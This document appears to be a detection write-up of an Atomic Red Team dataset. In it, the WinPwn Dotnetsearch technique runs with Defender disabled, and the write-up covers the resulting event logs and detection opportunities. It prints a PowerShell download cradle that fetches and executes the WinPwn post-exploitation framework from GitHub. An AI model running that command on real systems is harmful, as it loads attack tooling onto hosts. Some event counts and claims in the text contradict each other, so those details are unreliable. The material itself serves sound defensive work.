# T1518-4: Software Discovery — WinPwn Dotnetsearch

## Technique Context

T1518 (Software Discovery) encompasses adversary efforts to inventory software installed on a compromised host. WinPwn, developed by S3cur3Th1sSh1t, is a PowerShell-based post-exploitation framework with dozens of built-in functions covering discovery, privilege escalation, and lateral movement. The `Dotnetsearch` function specifically enumerates installed .NET Framework versions and related runtime components — information adversaries use to select compatible .NET-native payloads or identify lateral movement opportunities through applications that depend on specific runtime versions.

The defining behavioral signature here is the download cradle: `iex(new-object net.webclient).downloadstring(...)`. This pattern — loading a framework directly from a remote URL rather than dropping a file — is favored precisely because it avoids leaving a binary artifact on disk. The commit-pinned GitHub URL makes this dataset particularly valuable for threat intelligence correlation, since the exact WinPwn version is fixed.

In the defended variant, Windows Defender (via AMSI) blocked execution of the downloaded script after it arrived in memory, halting the technique before the `.NET` enumeration ran. This undefended dataset shows what the technique looks like when that block is removed.

## What This Dataset Contains

The dataset spans 7 seconds (2026-03-17 17:04:41–17:04:48 UTC) on ACME-WS06 running as NT AUTHORITY\SYSTEM. It contains 158 events across three channels: 114 PowerShell, 40 Sysmon, and 4 Security.

**Security (EID 4688, 4 events):** All four events are process creations. Two capture `whoami.exe` invocations — the ART test framework pre-flight check establishing execution context — both with creator `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`. The third is the key event: a child `powershell.exe` spawned with the full WinPwn download cradle:

```
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Dotnetsearch -noninteractive -consoleoutput}
```

The fourth is a cleanup invocation (`"powershell.exe" & {}`). The Security channel provides the complete process ancestry: SYSTEM-context parent `powershell.exe` at PID `0x4700` spawning the technique process at PID `0x4464`.

**Sysmon (40 events, EIDs 1, 3, 7, 10, 11, 17, 22):** Sysmon EID 1 captures two technique-relevant process creations. The first tags `whoami.exe` with `RuleName: technique_id=T1033,technique_name=System Owner/User Discovery`. The second captures the WinPwn `powershell.exe` with `RuleName: technique_id=T1059.001,technique_name=PowerShell` — the full command line is preserved verbatim including the commit-pinned URL and `Dotnetsearch` function invocation. Hashes for both processes are recorded: the `powershell.exe` binary carries `SHA256=3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8`.

Sysmon EID 22 (DNS query) is absent in the 40 events recorded — the DNS resolution for `raw.githubusercontent.com` was present in the defended variant but is not surfaced in the samples here. Sysmon EID 3 (NetworkConnect) records one connection from `powershell.exe` to a GitHub CDN IP. Sysmon EID 7 (ImageLoad) records 25 DLL load events into the PowerShell processes, tagged with rules including `technique_id=T1055,technique_name=Process Injection` for `.NET` runtime libraries (`mscoree.dll`, `mscoreei.dll`, etc.) — these reflect the WinPwn framework loading the .NET runtime as part of its enumeration activity. Sysmon EID 10 (ProcessAccess) fires four times as the parent PowerShell opens handles to child processes, tagged `technique_id=T1055.001,technique_name=Dynamic-link Library Injection`.

**PowerShell (114 events, EIDs 4100, 4103, 4104):** The 114 events reflect full script block and module logging across the entire test. EID 4103 records `Set-ExecutionPolicy Bypass -Scope Process -Force` (ART test framework boilerplate). EID 4104 captures 111 script block entries. Notably, a sample block reads `Set-ExecutionPolicy Bypass -Scope Process -Force` and the test cleanup script `Invoke-AtomicTest T1518 -TestNumbers 4 -Cleanup -Confirm:$false`. The WinPwn download and `Dotnetsearch` execution itself ran within the child `powershell.exe` process — because that process was able to complete without AMSI interference, more script blocks were generated compared to the defended variant's 51 events.

## What This Dataset Does Not Contain

- **No AMSI block event.** In the defended variant, EID 4100 captured a `ScriptContainedMaliciousContent` error from AMSI. That error is absent here because Defender is disabled and the WinPwn script executed successfully.
- **No output of the .NET enumeration itself.** Windows Event Logging does not capture stdout. You will not find the list of .NET versions that `Dotnetsearch` returned — only that the function was invoked.
- **No Defender cloud protection connections.** In the defended variant, EID 3 showed `MsMpEng.exe` connecting to `172.178.160.22:443` (Defender cloud service). Those connections are absent here because Defender is disabled.
- **No network connection record for the WinPwn download.** The TCP connection to `185.199.109.133:443` (GitHub CDN) may have occurred but was not captured in the 20 Sysmon samples surfaced; the DNS query and the actual download are evidenced primarily by the command line and the successful execution of the framework.

## Assessment

This dataset provides a clean, complete view of the WinPwn Dotnetsearch technique executing without interference. Compared to the defended variant (92 events: 51 PowerShell, 31 Sysmon, 10 Security), the undefended dataset is significantly larger — 158 events — because the WinPwn framework loaded and ran, generating substantial PowerShell script block activity that never materialized in the defended run. The core indicators are identical in both variants: the download cradle command line, the commit-pinned GitHub URL, and the `Dotnetsearch -noninteractive -consoleoutput` invocation pattern. What changes in the undefended variant is the absence of the AMSI block and the presence of additional .NET runtime DLL loads in Sysmon EID 7 reflecting actual framework execution.

The 25 Sysmon EID 7 (ImageLoad) events showing `mscoree.dll`, `mscoreei.dll`, and related .NET runtime components loading into `powershell.exe` are consistent with WinPwn's enumeration code running. In a real environment, this pattern — PowerShell loading the full .NET runtime immediately after a download cradle — combined with the GitHub CDN network connection, provides a layered detection opportunity without relying on AMSI.

## Detection Opportunities Present in This Data

- **Security EID 4688 command line:** The full WinPwn download cradle including the commit-pinned URL and function name (`Dotnetsearch`) is present verbatim. Matching on `raw.githubusercontent.com` combined with `iex` or `downloadstring` in process command line arguments is a high-fidelity indicator.
- **Sysmon EID 1 command line:** Same cradle captured with SHA256 hash of the `powershell.exe` binary and full parent process chain (`powershell → powershell`), enabling process tree correlation.
- **Sysmon EID 7 (ImageLoad):** The sequence of `.NET` runtime DLLs loading into a PowerShell process that just made a network connection is characteristic of in-memory framework execution and visible in this data.
- **Sysmon EID 10 (ProcessAccess):** The parent PowerShell opening `PROCESS_ALL_ACCESS` handles to child processes (GrantedAccess `0x1FFFFF`) is tagged `T1055.001` and present in both the defended and undefended variants.
- **PowerShell EID 4104:** Even though the WinPwn discovery output is not captured, the test cleanup block `Invoke-AtomicTest T1518 -TestNumbers 4 -Cleanup` appears in script block logging — test framework artifacts are visible and can be used to filter known-test traffic from real intrusion data.
